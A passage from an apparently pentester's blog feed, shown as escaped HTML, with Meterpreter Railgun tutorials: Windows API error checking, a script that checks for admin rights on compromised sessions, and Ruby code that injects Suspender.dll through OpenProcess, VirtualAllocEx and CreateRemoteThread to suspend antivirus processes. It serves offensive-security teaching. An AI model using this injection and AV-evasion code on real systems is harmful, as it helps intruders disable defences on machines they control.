-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;struct &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memread(result&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;return&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;)        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hostname &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; struct&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(nbi)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;].&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;2 lines… work 100% of the time in my test cases.&lt;/p&gt;
-&lt;p&gt;That&amp;rsquo;s it, you can check out the download for the post module above.&lt;/p&gt;
-&lt;p&gt;I do however have 1 disadvantage over how the guys at SecurityArtWork did things. You can&amp;rsquo;t thread it. For whatever reason the API call that I am using uses the exact same memory space for each lookup. I tried putting threading in and what I got was a bunch of systems that resolved to the exact same thing.&lt;/p&gt;
-&lt;p&gt;If anyone knows a way to fix this I am all ears because right now the module is slow.&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Railgun Error Checking</title>
-      <link>https://malicious.link/post/2011/2011-08-19-railgun-error-checking/</link>
-      <pubDate>Fri, 19 Aug 2011 02:13:01 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2011/2011-08-19-railgun-error-checking/</guid>
-      <description>&lt;p&gt;One important thing to note about Railgun is that you are querying the API and just as if you were using C++ the API you are calling just might not be there on the system you are trying to call it on. So here is a quick trick to find out if a the function (API) that you are trying to call is available to you:&lt;/p&gt;
-&lt;p&gt;For my example I&amp;rsquo;m using &amp;lsquo;getaddrinfo&amp;rsquo; since it&amp;rsquo;s life in Windows is somewhat odd. If a user has installed Windows 2000&amp;rsquo;s IPv6 package it&amp;rsquo;s there, if not, it&amp;rsquo;s not. So if you run up on a WinNT box or a Win2k box that doesn&amp;rsquo;t have an updater stack this function isn&amp;rsquo;t going to work for you.&lt;/p&gt;
-&lt;p&gt;(Just as a side note, this is not dependant on the fuction being defined in Railgun already)&lt;/p&gt;
-&lt;p&gt;getaddrinfo is in ws2_32.dll (WinSock), so we get a handle from that DLL first:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modhandle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;kernel32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GetModuleHandleA(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ws2_32.dll&amp;#39;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If that returns a error in the form of a Ruby hash with &amp;ldquo;GetLastError&amp;rdquo; being &amp;lsquo;127&amp;rsquo; that means that ws2_32.dll is either not there in the process. You will need to get it loaded into the process by calling client.railgun.ws2_32 or whatever DLL you are going for. (If it is not definied in Railgun this will fail and you&amp;rsquo;ll have to add the dll like I&amp;rsquo;ve talked about in previous posts)&lt;/p&gt;
-&lt;p&gt;So it&amp;rsquo;s pretty eash to handle that. If modhandle[&amp;ldquo;return&amp;rdquo;] == 0 something went wrong and we need to handle it, else we got a handle address and we can continue.&lt;/p&gt;
-&lt;p&gt;Next up is GetProcAddress:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;procaddr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;kernel32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GetProcAddress(modhandle&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;return&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;getaddrinfo&amp;#39;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Same deal, if procaddr[&amp;ldquo;return&amp;rdquo;] == 0 then we have an issue (probably the function doesnt&amp;rsquo; exist in that version of the DLL) else, we are good to go to call the function on the meterpreter session we are in and the system we are on.&lt;/p&gt;
-&lt;p&gt;Easy stuff, doing this on any of the Railgun scripts/post modules you have will greatly increase both the reliability and the user&amp;rsquo;s ability to know why it didn&amp;rsquo;t work.&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Remote DLL Injection with Meterpreter</title>
-      <link>https://malicious.link/post/2011/2011-05-30-remote-dll-injection-with-meterpreter/</link>
-      <pubDate>Mon, 30 May 2011 16:35:40 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2011/2011-05-30-remote-dll-injection-with-meterpreter/</guid>
-      <description>&lt;p&gt;Recently Didier Stevens wrote &amp;lsquo;Suspender.dll&amp;rsquo; which is a DLL that will suspend a process and all of it&amp;rsquo;s child processes after a delay. 60 seconds is it&amp;rsquo;s default but you can rename the DLL to add a number (as such &amp;lsquo;Suspender10.dll&amp;rsquo; for 10 seconds) to make the delay whatever you wish. You can find the blog post and download here: &lt;a href=&#34;http://blog.didierstevens.com/2011/04/27/suspender-dll/&#34;&gt;http://blog.didierstevens.com/2011/04/27/suspender-dll/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Jonathan Cran and I had the same idea, as I&amp;rsquo;m sure many others did as well. This might work against AntiVirus setups that protect themselves from being killed or their services stopped.&lt;/p&gt;
-&lt;p&gt;I still stand by my original claim that just removing it is easier (&lt;a href=&#34;https://malicious.link/blog/2010/11/16/silently-uninstall-sep&#34;&gt;Blog Post: Silently Uninstall SEP&lt;/a&gt;). However that might be something the user notices (A little shield disappearing).&lt;/p&gt;
-&lt;p&gt;Well, I didn&amp;rsquo;t know how to do this with meterpreter so a bit of google fu landed me on: &lt;a href=&#34;http://www.codeproject.com/KB/threads/winspy.aspx&#34;&gt;http://www.codeproject.com/KB/threads/winspy.aspx&lt;/a&gt; which has 3 different ways to attack the 2nd of which used a DLL (score!)&lt;/p&gt;
-&lt;p&gt;Using IRB within a meterpreter shell I started using Railgun (because once you know something sometimes its easy not too look for other solutions)&lt;/p&gt;
-&lt;p&gt;I start off setting up some variables after I&amp;rsquo;ve uploaded Suspender.dll:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1436&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sizeofsuspend &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52376&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pathtosuspend &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\Docume~1\Administrator\Desktop\Suspender10.dll&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Next up we need to open a handle on the target process:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;handle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;kernel32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;OpenProcess(&lt;span style=&#34;color:#66d9ef&#34;&gt;PROCESS_ALL_ACCESS&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;,pid)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;return&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With the handle we allocate some memory in the remote process for our DLL to live in:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;allocatedmem &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;kernel32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;VirtualAllocEx(handle,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;,sizeofsuspend,&lt;span style=&#34;color:#66d9ef&#34;&gt;MEM_COMMIT&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;PAGE_READWRITE&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;return&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Writing that DLL to memory isn&amp;rsquo;t much harder: (&lt;em&gt;&lt;strong&gt;this and the previous step is the wrong way to do things as we&amp;rsquo;ll see later&lt;/strong&gt;&lt;/em&gt;)&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;kernel32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;WriteProcessMemory(handle,allocatedmem,pathtosuspend,sizeofsuspend,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here is the hard part. We have to somehow figure out the address LoadLibraryA in the remote processes memory space, accounting for ASLR then pass it the location in memory where our DLL is hiding. Yah, I couldn&amp;rsquo;t figure this one out, here is the best I did:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;kernel32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CreateRemoteThread(handle,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,allocatedmem,pathtosuspend,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then I got a friendly reminder by HD that most of this was built into meterpreter already so all that railgun nastness boils down to someting a lot simpler. Set the variables again:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1436&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pathtosuspend &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\Docume~1\Administrator\Desktop\Suspender10.dll&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;But this time we are going to use the loadlibrary payload that just got added to Metasploit Framework in &lt;a href=&#34;https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12765&#34;&gt;r12765&lt;/a&gt;. We generate the payload with it pointing at our Suspender DLL:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pay &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;framework&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;payloads&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;create(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;windows/loadlibrary&amp;#34;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pay&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;datastore&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DLL&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pathtosuspend
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pay&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;datastore&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;EXITFUNC&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;thread&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;raw &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pay&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;generate
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Open the process, this time with Rex:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;targetprocess &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;process&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;open(pid, &lt;span style=&#34;color:#66d9ef&#34;&gt;PROCESS_ALL_ACCESS&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Allocate the memory in the remote process write the payload (not our DLL) into that space:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mem &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; targetprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;allocate(raw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;length &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (raw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;length &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;))
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;targetprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(mem, raw)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And finally create the remote thread.. MUCH easier (The power of Rex even over Railgun)&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;targetprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;create(mem, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And 10 seconds later our AV and all it&amp;rsquo;s children processes stop. Suspended by Didier&amp;rsquo;s Suspender.DLL. Thanks to HD for the slap in the head that I was doing things the wrong way and the 1 AM update to the framework that made this possible.&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Am I an Admin? Railgun Script</title>
-      <link>https://malicious.link/post/2010/2010-09-13-am-i-an-admin-railgun-script/</link>
-      <pubDate>Mon, 13 Sep 2010 17:45:31 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2010/2010-09-13-am-i-an-admin-railgun-script/</guid>
-      <description>&lt;p&gt;When you first step on a machine, you want to determine quickly if you are just a user or an administrator. Meterpreter doesn&amp;rsquo;t have a way to quickly check this. You could drop to a shell, check the local users group &amp;ldquo;Adminitrators&amp;rdquo;, and check your user, and correlate any groups that are shared between the outputs. You could do &amp;lsquo;getsystem&amp;rsquo; and if one works other than Kitrap0d. You could also just do a &amp;lsquo;ps&amp;rsquo; and notice that you can see &amp;lsquo;SYSTEM&amp;rsquo; processes.&lt;/p&gt;
-&lt;p&gt;But, I wanted to make a way that check a bunch of sessions all at once. So I wrote &amp;ldquo;AmIAdmin.rb&amp;rdquo; which uses meterpreter&amp;rsquo;s railgun extension to execute &amp;ldquo;IsUserAdmin&amp;rdquo;.&lt;/p&gt;
-&lt;p&gt;Being that Shell32.dll isn&amp;rsquo;t included in railgun by default we have to add it. After writing it I decided to add some checks. These checks make sure that each piece of the script isn&amp;rsquo;t already loaded. It&amp;rsquo;s a good reference for doing this in the future.&lt;/p&gt;
-&lt;p&gt;(you can remove the print_status lines if you want the script to be quieter)&lt;/p&gt;
-&lt;p&gt;Here is the script for your consumption:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;platform &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x64/win32&amp;#34;&lt;/span&gt;        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	print_status &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Railgun is currently not supported for x64 bit systems&amp;#34;&lt;/span&gt;         
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;raise&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Rex&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Script&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Completed&lt;/span&gt;        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;present? &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;       
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	print_status &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Railgun already loaded.. skipping&amp;#34;&lt;/span&gt;         
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	print_status &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Loading Railgun&amp;#34;&lt;/span&gt;         
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;core&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;use(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;railgun&amp;#34;&lt;/span&gt;)        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dll&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;shell32&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;       
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	print_status &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Adding Shell32.dll&amp;#34;&lt;/span&gt;         
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_dll(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;shell32&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;shell32&amp;#39;&lt;/span&gt;)        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	print_status &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Shell32 already loaded.. skipping&amp;#34;&lt;/span&gt;         
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
